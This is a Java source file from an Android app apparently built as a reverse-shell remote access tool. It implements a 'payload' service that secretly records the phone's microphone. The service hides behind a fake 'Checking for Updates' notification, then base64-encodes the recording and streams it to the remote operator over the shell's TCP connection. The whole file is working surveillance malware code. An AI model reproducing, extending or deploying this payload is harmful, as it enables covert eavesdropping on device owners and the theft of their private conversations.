package com.example.reverseshell2.Payloads;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.example.reverseshell2.R;
import com.example.reverseshell2.functions;
import com.example.reverseshell2.tcpConnection;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;


public class audioManager extends Service {


    static String TAG = "audioManagerClass";
    static File audiofile = null;
    MediaRecorder mRecorder = null;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        String ins = intent.getStringExtra("ins");
        if(ins.equals("startFore")){
            new functions(null).createNotiChannel(getApplicationContext());
            Notification notification = new NotificationCompat.Builder(getApplicationContext(),"channelid")
                    .setContentTitle("Checking for Updates")
                    .setContentText("Fetching")
                    .setSmallIcon(R.drawable.ic_launcher_foreground)
                    .setProgress(0,0,true)
                    .build();
            startForeground(4321, notification);
            startRecording(tcpConnection.out);
        }
        if(ins.equals("stopFore")){

            stopRecording(tcpConnection.out);
        }
        return START_STICKY;
    }

    public void startRecording(final OutputStream outputStream){
        try {
            File outputDir = getApplicationContext().getCacheDir();
            audiofile = File.createTempFile("sound", ".mpeg4", outputDir);
        } catch (IOException e) {
            e.printStackTrace();
            Log.e(TAG, "external storage access error");
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            mRecorder = new MediaRecorder();
            mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mRecorder.setOutputFile(audiofile);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            try {
                mRecorder.prepare();
                mRecorder.start();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            outputStream.write("Started Recording Audio\n".getBytes("UTF-8"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else {
            try {
                outputStream.write("Lower Android SDK Cant Record Audio\n".getBytes("UTF-8"));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

    }

    public void stopRecording(final OutputStream outputStream){

        if(mRecorder!=null){
            try{
                mRecorder.stop();
            }catch (IllegalStateException e){
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
                            return;
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                }).start();
            }
            mRecorder.release();
            if(audiofile.length()!=0 && audiofile.exists()){
                sendData(audiofile,outputStream);
            }else{
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            outputStream.write("Error in getting Audio Data\n".getBytes("UTF-8"));
                            return;
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }
            audiofile.delete();
        }else{
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write("Audio Service Not Started\n".getBytes("UTF-8"));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }



    private void sendData(File file, final OutputStream outputStream) {

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    outputStream.write("stopAudio\n".getBytes("UTF-8"));
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();
        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);

            final String encodedAudio = Base64.encodeToString(data, Base64.DEFAULT);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write(encodedAudio.getBytes("UTF-8"));
                        outputStream.write("END123\n".getBytes("UTF-8"));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    stopForeground(true);
                    stopSelf();
                }
            }).start();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


}
